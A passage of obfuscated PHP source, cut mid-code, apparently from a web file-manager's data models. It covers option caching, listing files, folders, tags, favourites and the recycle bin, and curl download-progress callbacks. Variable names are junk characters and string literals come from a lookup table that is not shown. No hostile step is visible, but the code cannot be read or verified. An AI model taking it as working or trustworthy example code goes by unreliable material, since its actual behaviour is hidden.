$üâÄ¹‚–[1]; $‡¨©¶ˆß =& $this->task; $this->sourceModelCopyFlag = !0; $úŸà¬ = 0; switch ($©ê·íÑÎ) { case $…Ø† ×”[572]: $úŸà¬ = 1; break; case $…Ø† ×”[575]: $‡¨©¶ˆß[$…Ø† ×”[1725]] = $ûÎ„Ì¸Ğ[$…Ø† ×”[32]]; break; case $…Ø† ×”[577]: $úŸà¬ = intval($üâÄ¹‚–[$…Ø† ×”[380]] * 0.4); break; case $…Ø† ×”[579]: $úŸà¬ = intval($üâÄ¹‚–[$…Ø† ×”[380]] * 0.2); break; case $…Ø† ×”[581]: $úŸà¬ = intval($üâÄ¹‚–[$…Ø† ×”[380]] * 0.4); break; } $this->update($úŸà¬); $this->sourceModelCopyFlag = !1; } public function sourceRemove($“¯”æ¼¶, $‹¬Œ¾¿¸) { $ÄçÕ©Ãö =& $_SERVER[óó‹¸‚å]; $this->sourceModelCopyFlag = !0; $öíÔ›½Õ = 1; if (isset($“¯”æ¼¶[$ÄçÕ©Ãö[79]])) { $öíÔ›½Õ = $“¯”æ¼¶[$ÄçÕ©Ãö[79]][$ÄçÕ©Ãö[77]]; $öíÔ›½Õ = $öíÔ›½Õ + $“¯”æ¼¶[$ÄçÕ©Ãö[79]][$ÄçÕ©Ãö[78]] + 1; } $this->update($öíÔ›½Õ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Ü€ÚÇñ‡) { $this->sourceRemove($Ü€ÚÇñ‡, !1); } public function curlProgress($±¾ê™“Ú, $è‚ƒ…»–, $„Š˜éø, $Â¡Ì¦¡†, $¨ÏøÊ¸ó) { $é½¯ıŞô =& $_SERVER[óó‹¸‚å]; $€Ü ïø§ =& $this->task; if ($¨ÏøÊ¸ó > 0) { $€Ü ïø§[$é½¯ıŞô[1071]] = $é½¯ıŞô[1747]; $€Ü ïø§[$é½¯ıŞô[1729]] = $é½¯ıŞô[107]; if ($€Ü ïø§[$é½¯ıŞô[1727]]) { $€Ü ïø§[$é½¯ıŞô[1728]] = $¨ÏøÊ¸ó; } if ($€Ü ïø§[$é½¯ıŞô[1730]]) { $€Ü ïø§[$é½¯ıŞô[1728]] = $¨ÏøÊ¸ó + $€Ü ïø§[$é½¯ıŞô[1730]]; } } else { if ($„Š˜éø > 0) { if ($€Ü ïø§[$é½¯ıŞô[1727]] == $è‚ƒ…»–) { $€Ü ïø§[$é½¯ıŞô[1728]] = $„Š˜éø; $€Ü ïø§[$é½¯ıŞô[1071]] = $é½¯ıŞô[1748]; $€Ü ïø§[$é½¯ıŞô[1729]] = $é½¯ıŞô[1202]; } } } $this->update(); } public function curlProgressStart($»ÍØÄëô) { } public function curlProgressEnd($ì„è÷êã) { $±´µ“éË =& $_SERVER[óó‹¸‚å]; $ÍĞş€ÃÂ =& $this->task; $µ·¸ÇøÚ = curl_getinfo($ì„è÷êã); $äƒß¾ñ£ = $µ·¸ÇøÚ[$±´µ“éË[1749]]; if ($äƒß¾ñ£ == -1) { $äƒß¾ñ£ = $µ·¸ÇøÚ[$±´µ“éË[1750]]; } if ($ÍĞş€ÃÂ[$±´µ“éË[1729]] == $±´µ“éË[107] && $äƒß¾ñ£) { $ÍĞş€ÃÂ[$±´µ“éË[1730]] += $äƒß¾ñ£; } $this->update(); } } goto d’µ”­çÀù; D‹ÙÏÀ“šè: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ƒìí‡° = false, $à­ãçó‰ = '', $óÆàŞœ± = false) { $”ãà÷€ =& $_SERVER[óó‹¸‚å]; $Éœ‘ŞÙı = $this->cacheGet($à­ãçó‰); $Ã×ª…°’ = $this->optionDefault($à­ãçó‰); $Ã×ª…°’ = is_array($Ã×ª…°’) ? $Ã×ª…°’ : array(); if (is_array($Éœ‘ŞÙı)) { $Éœ‘ŞÙı = array_merge($Ã×ª…°’, $Éœ‘ŞÙı); return $ƒìí‡° ? isset($Éœ‘ŞÙı[$ƒìí‡°]) ? $Éœ‘ŞÙı[$ƒìí‡°] : null : $Éœ‘ŞÙı; } $ğºûãú = $this->filterWhere(array($”ãà÷€[33] => $à­ãçó‰)); $Éœ‘ŞÙı = $this->where($ğºûãú)->select(); $Éœ‘ŞÙı = array_to_keyvalue($Éœ‘ŞÙı, $”ãà÷€[94], $”ãà÷€[374]); foreach ($Éœ‘ŞÙı as $äÄ†ıòæ => $¾œÕîÊ‡) { if ($óÆàŞœ± || in_array($äÄ†ıòæ, $this->jsonField)) { $Éœ‘ŞÙı[$äÄ†ıòæ] = json_decode($¾œÕîÊ‡, !0); } } $this->cacheSet($à­ãçó‰, $Éœ‘ŞÙı); $Éœ‘ŞÙı = array_merge($Ã×ª…°’, $Éœ‘ŞÙı); return $ƒìí‡° ? $Éœ‘ŞÙı[$ƒìí‡°] : $Éœ‘ŞÙı; } public function set($ù¶ôÕ¤ï, $æ’ğßçÙ = false, $æäØ‡É¦ = '') { $éËÜú¾ =& $_SERVER[óó‹¸‚å]; $this->cacheRemove($æäØ‡É¦); $İøíëëø = array(); $Ìø•¹Õ© = is_array($ù¶ôÕ¤ï) ? $ù¶ôÕ¤ï : array($ù¶ôÕ¤ï => $æ’ğßçÙ); foreach ($Ìø•¹Õ© as $¢„÷‹œ => $£­€õá–) { if (is_array($£­€õá–)) { $£­€õá– = json_encode_force($£­€õá–); } $this->checkLength($£­€õá–, !1, $this->tableName . $éËÜú¾[4] . $ù¶ôÕ¤ï); $£­€õá– = self::textEncode($£­€õá–); $Ìø•¹Õ© = array($éËÜú¾[33] => $æäØ‡É¦, $éËÜú¾[94] => $¢„÷‹œ, $éËÜú¾[374] => $£­€õá–); $İøíëëø[] = $this->filterWhere($Ìø•¹Õ©); } if (!$İøíëëø) { return !0; } $›¬œ„³ = $this->cacheKey($éËÜú¾[400]); CacheLock::lock($›¬œ„³); $©ÒÛ©ÁÜ = $this->addAll($İøíëëø, array(), !0); CacheLock::unlock($›¬œ„³); return $©ÒÛ©ÁÜ; } protected function optionDefault($âà…æÆÂ = '') { return !1; } public function setDeep($ÙØÍî, $šÛ†æÃí = false, $¶ŸÓ£Çè = '') { $Õì…ïÀ· = explode($_SERVER[óó‹¸‚å][10], $ÙØÍî); $¤÷úáÚ = $this->get(); array_set_value($¤÷úáÚ, $ÙØÍî, $šÛ†æÃí); $this->set($Õì…ïÀ·[0], $¤÷úáÚ[$Õì…ïÀ·[0]], $¶ŸÓ£Çè); } public function remove($ÆÈğ»•İ, $®é˜Á×ƒ = '') { $òûıÍ÷ =& $_SERVER[óó‹¸‚å]; $this->cacheRemove($®é˜Á×ƒ); $‡úÏ « = $this->filterWhere(array($òûıÍ÷[94] => $ÆÈğ»•İ, $òûıÍ÷[33] => $®é˜Á×ƒ)); if (is_null($ÆÈğ»•İ)) { unset($‡úÏ «[$òûıÍ÷[94]]); } return $this->where($‡úÏ «)->delete(); } public function cacheSet($¼®ÒÖ, $ß¯Ç•†² = false) { return Cache::set($this->cacheKey($¼®ÒÖ), $ß¯Ç•†²); } public function cacheGet($ùÎÉ¥ù) { return Cache::get($this->cacheKey($ùÎÉ¥ù)); } public function cacheRemove($¼·¶À©û) { return Cache::remove($this->cacheKey($¼·¶À©û)); } protected function filterWhere($­Š”şœÑ) { return $­Š”şœÑ; } protected function cacheKey($½çÌÁ«Ü) { return $½çÌÁ«Ü; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\145"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\141\155\145" => "\x69\157\x5f\163\157\x75\x72\x63\145\x5f\x6d\145\x74\141", "\155\x65\x74\x61\x46\151\x65\154\x64" => "\x73\x6f\165\162\x63\x65\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\124\x69\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\x73\145\162\164", "\146\165\x6e\143\164\151\157\156"), array("\143\162\x65\x61\x74\x65\x54\151\x6d\x65", "\164\x69\155\145", "\151\x6e\163\x65\162\x74", "\x66\x75\156\143\164\151\x6f\156"), array("\x76\x69\x65\167\x54\x69\155\x65", "\x74\151\155\145", "\x69\156\x73\145\162\x74", "\x66\x75\156\x63\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÌÎá©ñ) { return $this->listSource(array($_SERVER[óó‹¸‚å][401] => $ÌÎá©ñ)); } public function typeName($“¨¥Äêí) { static $µöœ¾¢ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\x65\x6d", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\x67\162\157\165\160"); return $µöœ¾¢[$“¨¥Äêí . $_SERVER[óó‹¸‚å][12]]; } public function sourceListInfo($ü‹Û“¤È, $¥ªİ§ç­ = false) { $ŒÂöÄÎ =& $_SERVER[óó‹¸‚å]; $ü‹Û“¤È = $ü‹Û“¤È ? $ü‹Û“¤È : array(); $ü‹Û“¤È = array_filter(array_unique($ü‹Û“¤È)); if (!$ü‹Û“¤È) { return array(); } $şÇ°Ü“€ = $this->where(array($ŒÂöÄÎ[402] => array($ŒÂöÄÎ[7], $ü‹Û“¤È)))->select(); $this->_listDataApply($şÇ°Ü“€, $¥ªİ§ç­); return array_to_keyvalue($şÇ°Ü“€, $ŒÂöÄÎ[402]); } public function pathInfoFilter(&$Ù§¤˜¶õ) { $•ñÙÛÖğ =& $_SERVER[óó‹¸‚å]; static $º¿ÈÂıÀ = false; static $Ü†‘Ïò¿ = false; static $¹³Œ¾ = false; if (!$º¿ÈÂıÀ) { $ÀÃ¦ÈĞÁ = $•ñÙÛÖğ[403]; $ÀÃ¦ÈĞÁ .= $•ñÙÛÖğ[404]; $ÀÃ¦ÈĞÁ .= $•ñÙÛÖğ[405]; $½­ÖÂ½æ = $•ñÙÛÖğ[406]; $Œ¤ğ¤¤œ = explode($•ñÙÛÖğ[50], $½­ÖÂ½æ); $º¿ÈÂıÀ = explode($•ñÙÛÖğ[50], $ÀÃ¦ÈĞÁ); $Ü†‘Ïò¿ = array(); foreach ($º¿ÈÂıÀ as $ÃõÆóƒĞ) { if (in_array($ÃõÆóƒĞ, $Œ¤ğ¤¤œ)) { continue; } $Ü†‘Ïò¿[] = $ÃõÆóƒĞ; } $¹³Œ¾ = explode($•ñÙÛÖğ[50], $•ñÙÛÖğ[407]); } foreach ($¹³Œ¾ as $ÏÔøí‹ú) { if (isset($Ù§¤˜¶õ[$ÏÔøí‹ú])) { $Ù§¤˜¶õ[$ÏÔøí‹ú] = intval($Ù§¤˜¶õ[$ÏÔøí‹ú]); } } $Ù§¤˜¶õ[$•ñÙÛÖğ[84]] = $•ñÙÛÖğ[408] . $Ù§¤˜¶õ[$•ñÙÛÖğ[402]] . $•ñÙÛÖğ[409]; $Ù§¤˜¶õ[$•ñÙÛÖğ[33]] = $Ù§¤˜¶õ[$•ñÙÛÖğ[410]] == 1 ? $•ñÙÛÖğ[75] : $•ñÙÛÖğ[199]; $Ù§¤˜¶õ[$•ñÙÛÖğ[411]] = $this->typeName($Ù§¤˜¶õ[$•ñÙÛÖğ[411]]); if ($Ù§¤˜¶õ[$•ñÙÛÖğ[410]] != 1) { $Ù§¤˜¶õ[$•ñÙÛÖğ[174]] = $Ù§¤˜¶õ[$•ñÙÛÖğ[412]]; unset($Ù§¤˜¶õ[$•ñÙÛÖğ[412]]); } $‘ºÚçÔÖ = $º¿ÈÂıÀ; if (isset($Ù§¤˜¶õ[$•ñÙÛÖğ[413]]) && $Ù§¤˜¶õ[$•ñÙÛÖğ[413]][$•ñÙÛÖğ[414]] == -1) { $‘ºÚçÔÖ = $Ü†‘Ïò¿; } $Ù§¤˜¶õ = array_field_key($Ù§¤˜¶õ, $‘ºÚçÔÖ); return $Ù§¤˜¶õ; } public function listUserFav() { $ª—ßÃ”ù =& $_SERVER[óó‹¸‚å]; $é±Š¯…´ = Model($ª—ßÃ”ù[415])->listData(); $¿Ó‚­„Ø = array_filter_by_field($é±Š¯…´, $ª—ßÃ”ù[33], $ª—ßÃ”ù[416]); $¿Ó‚­„Ø = array_to_keyvalue($¿Ó‚­„Ø, $ª—ßÃ”ù[12], $ª—ßÃ”ù[84]); if ($¿Ó‚­„Ø) { $í×Û™¼° = $this->listSource(array($ª—ßÃ”ù[417] => array($ª—ßÃ”ù[418], $¿Ó‚­„Ø))); } $í×Û™¼° = array_to_keyvalue($í×Û™¼°[$ª—ßÃ”ù[369]], $ª—ßÃ”ù[402]); foreach ($é±Š¯…´ as &$®ê¼ê‘) { $®ê¼ê‘ = array($ª—ßÃ”ù[419] => $®ê¼ê‘[$ª—ßÃ”ù[399]], $ª—ßÃ”ù[420] => $®ê¼ê‘[$ª—ßÃ”ù[32]], $ª—ßÃ”ù[421] => $®ê¼ê‘[$ª—ßÃ”ù[84]], $ª—ßÃ”ù[422] => $®ê¼ê‘[$ª—ßÃ”ù[33]], $ª—ßÃ”ù[423] => $®ê¼ê‘[$ª—ßÃ”ù[200]], $ª—ßÃ”ù[424] => $®ê¼ê‘[$ª—ßÃ”ù[85]]); if ($®ê¼ê‘[$ª—ßÃ”ù[33]] == $ª—ßÃ”ù[416] && $í×Û™¼°[$®ê¼ê‘[$ª—ßÃ”ù[84]]]) { $®ê¼ê‘[$ª—ßÃ”ù[86]] = $í×Û™¼°[$®ê¼ê‘[$ª—ßÃ”ù[84]]]; } } unset($®ê¼ê‘); return $é±Š¯…´; } public function listUserTag($§¬Ë¼È—) { $‚¥ÅòŠ¸ =& $_SERVER[óó‹¸‚å]; if ($§¬Ë¼È— && !is_array($§¬Ë¼È—)) { $§¬Ë¼È— = array($§¬Ë¼È—); } $İ¨‹¶¡ş = Model($‚¥ÅòŠ¸[425])->listData(); $Š…ø÷Üú = array(); $Š´Ï£½ = array(); foreach ($İ¨‹¶¡ş as $‘Òé—ßï) { $›Ìİ™€ = $‘Òé—ßï[$‚¥ÅòŠ¸[84]]; if (!$›Ìİ™€) { continue; } if (!isset($Š´Ï£½[$›Ìİ™€])) { $Š´Ï£½[$›Ìİ™€] = array(); } $Š´Ï£½[$›Ìİ™€][] = $‘Òé—ßï[$‚¥ÅòŠ¸[426]]; $Š…ø÷Üú[$‘Òé—ßï[$‚¥ÅòŠ¸[84]]] = $‘Òé—ßï; } $ƒóÁ¡ĞÎ = array(); $Şú¬«•³ = array(); $°¸µº = array(); foreach ($Š´Ï£½ as $™–ªÒË => $ğĞášßñ) { $Ô³ç¶ùû = !0; if (!$§¬Ë¼È—) { $ƒóÁ¡ĞÎ[] = $™–ªÒË; continue; } foreach ($§¬Ë¼È— as $œüÛó) { if (!in_array($œüÛó, $ğĞášßñ)) { $Ô³ç¶ùû = !1; break; } } if (!$Ô³ç¶ùû) { continue; } if (!is_numeric($™–ªÒË)) { $ŞÉÚ¼Ó÷ = $Š…ø÷Üú[$™–ªÒË]; $½Á¨¬›´ = array($‚¥ÅòŠ¸[32] => $ŞÉÚ¼Ó÷[$‚¥ÅòŠ¸[32]], $‚¥ÅòŠ¸[84] => $ŞÉÚ¼Ó÷[$‚¥ÅòŠ¸[84]], $‚¥ÅòŠ¸[33] => $ŞÉÚ¼Ó÷[$‚¥ÅòŠ¸[33]], $‚¥ÅòŠ¸[86] => array($‚¥ÅòŠ¸[427] => 1), $‚¥ÅòŠ¸[201] => !0); if ($ŞÉÚ¼Ó÷[$‚¥ÅòŠ¸[33]] == $‚¥ÅòŠ¸[199]) { $°¸µº[] = $½Á¨¬›´; } if ($ŞÉÚ¼Ó÷[$‚¥ÅòŠ¸[33]] == $‚¥ÅòŠ¸[75]) { $Şú¬«•³[] = $½Á¨¬›´; } continue; } $ƒóÁ¡ĞÎ[] = $™–ªÒË; } if ($ƒóÁ¡ĞÎ) { $Ê›ƒìÈ¼ = $this->listSource(array($‚¥ÅòŠ¸[417] => array($‚¥ÅòŠ¸[418], $ƒóÁ¡ĞÎ))); } $Ê›ƒìÈ¼ = $Ê›ƒìÈ¼ ? $Ê›ƒìÈ¼ : array($‚¥ÅòŠ¸[82] => array(), $‚¥ÅòŠ¸[83] => array()); $Ê›ƒìÈ¼[$‚¥ÅòŠ¸[82]] = array_merge($Ê›ƒìÈ¼[$‚¥ÅòŠ¸[82]], $Şú¬«•³); $Ê›ƒìÈ¼[$‚¥ÅòŠ¸[83]] = array_merge($Ê›ƒìÈ¼[$‚¥ÅòŠ¸[83]], $°¸µº); if (isset($Ê›ƒìÈ¼[$‚¥ÅòŠ¸[366]]) && count($ƒóÁ¡ĞÎ) == $Ê›ƒìÈ¼[$‚¥ÅòŠ¸[366]][$‚¥ÅòŠ¸[367]]) { return $Ê›ƒìÈ¼; } $â¡»™äÙ = array(); $¼µâØ° = array_to_keyvalue($Ê›ƒìÈ¼[$‚¥ÅòŠ¸[82]], $‚¥ÅòŠ¸[12], $‚¥ÅòŠ¸[402]); $Úò‹”úâ = array_to_keyvalue($Ê›ƒìÈ¼[$‚¥ÅòŠ¸[83]], $‚¥ÅòŠ¸[12], $‚¥ÅòŠ¸[402]); $ø·ü¾¢Â = array_merge($Úò‹”úâ, $¼µâØ°); foreach ($ƒóÁ¡ĞÎ as $›Ìİ™€) { if (!in_array($›Ìİ™€, $ø·ü¾¢Â)) { $â¡»™äÙ[] = $›Ìİ™€; } } if ($â¡»™äÙ) { Model($‚¥ÅòŠ¸[428])->removeBySource($â¡»™äÙ); } return $Ê›ƒìÈ¼; } public function listUserRecycle() { $ÄÏÇªÕ± =& $_SERVER[óó‹¸‚å]; $‚ØÃòÁÓ = Model($ÄÏÇªÕ±[429])->listData(); if (!$‚ØÃòÁÓ) { return array(); } $„˜•›áÀ = array($ÄÏÇªÕ±[417] => array($ÄÏÇªÕ±[418], $‚ØÃòÁÓ), $ÄÏÇªÕ±[430] => 1); return $this->listSource($„˜•›áÀ); } public function listSource($ÎıƒÃ¨¶, $èÆœÙ = 3000, $ÈŒ³ƒˆ’ = false) { $¶ ¯Î‘© =& $_SERVER[óó‹¸‚å]; if (!isset($ÎıƒÃ¨¶[$¶ ¯Î‘©[431]])) { $ÎıƒÃ¨¶[$¶ ¯Î‘©[431]] = 0; } if (isset($ÎıƒÃ¨¶[$¶ ¯Î‘©[432]]) && $ÎıƒÃ¨¶[$¶ ¯Î‘©[432]] == $¶ ¯Î‘©[197]) { $ÎıƒÃ¨¶[$¶ ¯Î‘©[412]] = array($¶ ¯Î‘©[331], $¶ ¯Î‘©[433]); } $²‘½–“ = $¶ ¯Î‘©[434]; $ô³£”§Ö = $this->field($²‘½–“)->_makeOrder()->where($ÎıƒÃ¨¶)->selectPage($èÆœÙ); $this->_listPageCheck($ô³£”§Ö, $²‘½–“, $ÎıƒÃ¨¶); $this->_listDataApply($ô³£”§Ö[$¶ ¯Î‘©[369]], $ÈŒ³ƒˆ’); $this->_listMake($ô³£”§Ö); return $ô³£”§Ö; } private function _listPageCheck(&$²‹ÁËå–, $¤é»ËÊƒ, $È·¦ø¼¿) { $ó´Û†ºÌ =& $_SERVER[óó‹¸‚å]; if (!is_array($²‹ÁËå–[$ó´Û†ºÌ[366]])) { return; } $²¦ŒŒ  = $²‹ÁËå–[$ó´Û†ºÌ[366]]; if ($²¦ŒŒ [$ó´Û†ºÌ[368]] <= 1) { return; } if ($²¦ŒŒ [$ó´Û†ºÌ[367]] >= 100000) { return; } if (Model($ó´Û†ºÌ[435])->get($ó´Û†ºÌ[436]) != $ó´Û†ºÌ[437]) { return; } $¤é»ËÊƒ = str_replace(array($ó´Û†ºÌ[53], $ó´Û†ºÌ[342], $ó´Û†ºÌ[231]), $ó´Û†ºÌ[12], $¤é»ËÊƒ); $¤é»ËÊƒ = $ó´Û†ºÌ[438] . str_replace($ó´Û†ºÌ[50], $ó´Û†ºÌ[439], $¤é»ËÊƒ) . $ó´Û†ºÌ[440]; $Ğ„Úç‚É = $ó´Û†ºÌ[441]; $Ğ„Úç‚É = $Ğ„Úç‚É . $ó´Û†ºÌ[442]; $çüßàÉ = $²¦ŒŒ [$ó´Û†ºÌ[363]] * ($²¦ŒŒ [$ó´Û†ºÌ[353]] - 1) . $ó´Û†ºÌ[50] . $²¦ŒŒ [$ó´Û†ºÌ[363]]; $…±Š®¹½ = $this->_makeOrder(!0); $›•ì®–‚ = $ó´Û†ºÌ[438] . str_replace($ó´Û†ºÌ[50], $ó´Û†ºÌ[439], $…±Š®¹½[0]); if (strpos($›•ì®–‚, $ó´Û†ºÌ[443])) { $›•ì®–‚ = str_replace($ó´Û†ºÌ[443], $ó´Û†ºÌ[444], $›•ì®–‚); } else { $›•ì®–‚ .= $ó´Û†ºÌ[445] . $…±Š®¹½[1]; } $÷Í†óö… = array(); foreach ($È·¦ø¼¿ as $ ıŞøĞ÷ => $ä›Ç’¹) { $÷Í†óö…[$ó´Û†ºÌ[438] . $ ıŞøĞ÷] = $ä›Ç’¹; } $this->alias($ó´Û†ºÌ[446])->field($¤é»ËÊƒ)->limit($çüßàÉ)->order($›•ì®–‚); $‡€‹ßÄĞ = $this->join($Ğ„Úç‚É)->where($÷Í†óö…)->select(); if ($‡€‹ßÄĞ) { $²‹ÁËå–[$ó´Û†ºÌ[369]] = $‡€‹ßÄĞ; } } protected function _makeOrder($ÓÉ³Ùú = false) { $ÇåÒ¨ÛÍ =& $_SERVER[óó‹¸‚å]; $ÌŠõîÜç = Model($ÇåÒ¨ÛÍ[447])->get($ÇåÒ¨ÛÍ[448]); $Õğá»Ä‡ = Model($ÇåÒ¨ÛÍ[447])->get($ÇåÒ¨ÛÍ[449]); $¤´âæûµ = array($ÇåÒ¨ÛÍ[450] => $ÇåÒ¨ÛÍ[451], $ÇåÒ¨ÛÍ[452] => $ÇåÒ¨ÛÍ[453]); $©…¢è‰È = array($ÇåÒ¨ÛÍ[32] => $ÇåÒ¨ÛÍ[32], $ÇåÒ¨ÛÍ[76] => $ÇåÒ¨ÛÍ[76], $ÇåÒ¨ÛÍ[174] => $ÇåÒ¨ÛÍ[412], $ÇåÒ¨ÛÍ[454] => $ÇåÒ¨ÛÍ[454], $ÇåÒ¨ÛÍ[455] => $ÇåÒ¨ÛÍ[456], $ÇåÒ¨ÛÍ[200] => $ÇåÒ¨ÛÍ[200], $ÇåÒ¨ÛÍ[85] => $ÇåÒ¨ÛÍ[85]); $ú§ÔÒõ¨ = Input::get($ÇåÒ¨ÛÍ[457], $ÇåÒ¨ÛÍ[7], $ÌŠõîÜç, array_keys($©…¢è‰È)); $·¹µÖ¥Ô = Input::get($ÇåÒ¨ÛÍ[458], $ÇåÒ¨ÛÍ[7], $Õğá»Ä‡, array_keys($¤´âæûµ)); if (!in_array($ú§ÔÒõ¨, array_keys($©…¢è‰È))) { $ú§ÔÒõ¨ = $ÇåÒ¨ÛÍ[32]; } if (!in_array($·¹µÖ¥Ô, array_keys($¤´âæûµ))) { $ú§ÔÒõ¨ = $ÇåÒ¨ÛÍ[450]; } if ($ú§ÔÒõ¨ == $ÇåÒ¨ÛÍ[32]) { } $¶Ÿ£ŸÏ‘ = $ÇåÒ¨ÛÍ[459] . $©…¢è‰È[$ú§ÔÒõ¨] . $ÇåÒ¨ÛÍ[53] . $¤´âæûµ[$·¹µÖ¥Ô]; $¶Ÿ£ŸÏ‘ = rtrim(trim($¶Ÿ£ŸÏ‘), $ÇåÒ¨ÛÍ[50]); if ($ÓÉ³Ùú) { return array($¶Ÿ£ŸÏ‘, $¤´âæûµ[$·¹µÖ¥Ô]); } return $this->order($¶Ÿ£ŸÏ‘); } protected function _listDataApplyItem($®Ø©û, $™‘ô Ÿ¥ = false) { $–ßûÜç­ = array($®Ø©û); $this->_listDataApply($–ßûÜç­, $™‘ô Ÿ¥); return $–ßûÜç­[0]; } protected function _listDataApply(&$Ñ¶ï®, $„²ÌÆ… = false) { $ÚìÅ‹€ğ =& $_SERVER[óó‹¸‚å]; if (!$Ñ¶ï®) { $Ñ¶ï® = array(); return; } $ç‹‚ˆÏĞ = array_to_keyvalue($Ñ¶ï®, $ÚìÅ‹€ğ[12], $ÚìÅ‹€ğ[402]); $ç‹‚ˆÏĞ = array_unique($ç‹‚ˆÏĞ); $this->_listSourceCache($Ñ¶ï®); if (!$„²ÌÆ…) { $this->_listAppendMeta($Ñ¶ï®, $ç‹‚ˆÏĞ); $this->_listAppendFileMeta($Ñ¶ï®, $ç‹‚ˆÏĞ); $this->_listAppendChildren($Ñ¶ï®, $ç‹‚ˆÏĞ); } $this->_listAppendPath($Ñ¶ï®); $this->_listAppendAuth($Ñ¶ï®); $this->_listAppendSourceInfo($Ñ¶ï®, $ç‹‚ˆÏĞ); $this->_listAppendUser($Ñ¶ï®); $this->_listFilterInfo($Ñ¶ï®, $„²ÌÆ…); $this->_listAppendAuthSecret($Ñ¶ï®); } protected function _listSourceCache($×Ÿ›ø•Ÿ) { $ğ¹ˆ¶êü =& $_SERVER[óó‹¸‚å]; foreach ($×Ÿ›ø•Ÿ as $½ú½æÍ¾) { self::$cacheSourceInfo[$ğ¹ˆ¶êü[460] . $½ú½æÍ¾[$ğ¹ˆ¶êü[402]]] = $½ú½æÍ¾; } } protected function _listFilterInfo(&$´½ÏçÉŞ, $èğÊÏ®‚ = false) { $ƒ›ùÕí½ =& $_SERVER[óó‹¸‚å]; foreach ($´½ÏçÉŞ as &$ïÓÑö¶) { $ïÓÑö¶ = $this->pathInfoFilter($ïÓÑö¶); self::$cachePathInfo[$ƒ›ùÕí½[461] . intval($èğÊÏ®‚) . $ƒ›ùÕí½[386] . $ïÓÑö¶[$ƒ›ùÕí½[402]]] = $ïÓÑö¶; } unset($ïÓÑö¶); } protected function _listMake(&$šÌù©™) { $ğ¿Üƒğ =& $_SERVER[óó‹¸‚å]; $šÌù©™[$ğ¿Üƒğ[82]] = array(); $šÌù©™[$ğ¿Üƒğ[83]] = array(); foreach ($šÌù©™[$ğ¿Üƒğ[369]] as $œ€®¾ ¾) { $Ô¼öïÍÌ = $œ€®¾ ¾[$ğ¿Üƒğ[410]] == 1 ? $ğ¿Üƒğ[82] : $ğ¿Üƒğ[83]; $šÌù©™[$Ô¼öïÍÌ][] = $œ€®¾ ¾; } unset($šÌù©™[$ğ¿Üƒğ[369]]); } protected function _listAppendMeta(&$‰ãÖúÒÔ, $˜µ“¹“È) { $Ü¿¾§ö¤ =& $_SERVER[óó‹¸‚å]; $şÅŞŞ§® = array($Ü¿¾§ö¤[417] => array($Ü¿¾§ö¤[418], $˜µ“¹“È)); $ÔÊÚ²•‹ = Model($Ü¿¾§ö¤[462])->field($Ü¿¾§ö¤[463])->where($şÅŞŞ§®)->select(); if (!$ÔÊÚ²•‹) { return; } $ñ“²Ğäş = array($Ü¿¾§ö¤[464], $Ü¿¾§ö¤[465], $Ü¿¾§ö¤[444]); $¦»©áŞ£ = array(); foreach ($ÔÊÚ²•‹ as $±Êùú÷ú) { if (!isset($¦»©áŞ£[$±Êùú÷ú[$Ü¿¾§ö¤[402]]])) { $¦»©áŞ£[$±Êùú÷ú[$Ü¿¾§ö¤[402]]] = array(); } if (in_array($±Êùú÷ú[$Ü¿¾§ö¤[94]], $ñ“²Ğäş)) { continue; } $¦»©áŞ£[$±Êùú÷ú[$Ü¿¾§ö¤[402]]][$±Êùú÷ú[$Ü¿¾§ö¤[94]]] = $±Êùú÷ú[$Ü¿¾§ö¤[374]]; } foreach ($‰ãÖúÒÔ as &$âãË³) { $âãË³[$Ü¿¾§ö¤[466]] = !1; if (isset($¦»©áŞ£[$âãË³[$Ü¿¾§ö¤[402]]])) { $âãË³[$Ü¿¾§ö¤[466]] = $¦»©áŞ£[$âãË³[$Ü¿¾§ö¤[402]]]; } if ($this->fileIsLock($âãË³) && $âãË³[$Ü¿¾§ö¤[413]]) { $›ÁöÇËÁ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $âãË³[$Ü¿¾§ö¤[413]][$Ü¿¾§ö¤[414]] = AuthModel::authDisable($âãË³[$Ü¿¾§ö¤[413]][$Ü¿¾§ö¤[414]], $›ÁöÇËÁ); $âãË³[$Ü¿¾§ö¤[413]][$Ü¿¾§ö¤[467]][$Ü¿¾§ö¤[413]] = $âãË³[$Ü¿¾§ö¤[413]][$Ü¿¾§ö¤[414]]; } } unset($âãË³); } protected function _listAppendFileMeta(&$¬´öÙ¼², $•ÕôÓäÉ) { $ëÇó’Á§ =& $_SERVER[óó‹¸‚å]; $¼ö°¬·Ú = array_to_keyvalue($¬´öÙ¼², $ëÇó’Á§[12], $ëÇó’Á§[468]); $¼ö°¬·Ú = array_filter(array_unique($¼ö°¬·Ú)); if (!$¼ö°¬·Ú) { return; } $ß¯²÷…© = array($ëÇó’Á§[469] => array($ëÇó’Á§[418], $¼ö°¬·Ú)); $ë›„Ã„¼ = $ëÇó’Á§[470]; $øÈĞ²Ô = Model($ëÇó’Á§[471])->field($ë›„Ã„¼)->where($ß¯²÷…©)->select(); $øÈĞ²Ô = array_to_keyvalue($øÈĞ²Ô, $ëÇó’Á§[468]); $ğÆ‡ÁŞŸ = Model($ëÇó’Á§[472])->field($ëÇó’Á§[473])->where($ß¯²÷…©)->select(); $ğÆ‡ÁŞŸ = $ğÆ‡ÁŞŸ ? $ğÆ‡ÁŞŸ : array(); $ø¨Æ²İ  = array(); foreach ($ğÆ‡ÁŞŸ as $ç—â˜°) { if (!isset($ø¨Æ²İ [$ç—â˜°[$ëÇó’Á§[468]]])) { $ø¨Æ²İ [$ç—â˜°[$ëÇó’Á§[468]]] = array(); } $ø¨Æ²İ [$ç—â˜°[$ëÇó’Á§[468]]][$ç—â˜°[$ëÇó’Á§[94]]] = $ç—â˜°[$ëÇó’Á§[374]]; } foreach ($¬´öÙ¼² as &$ 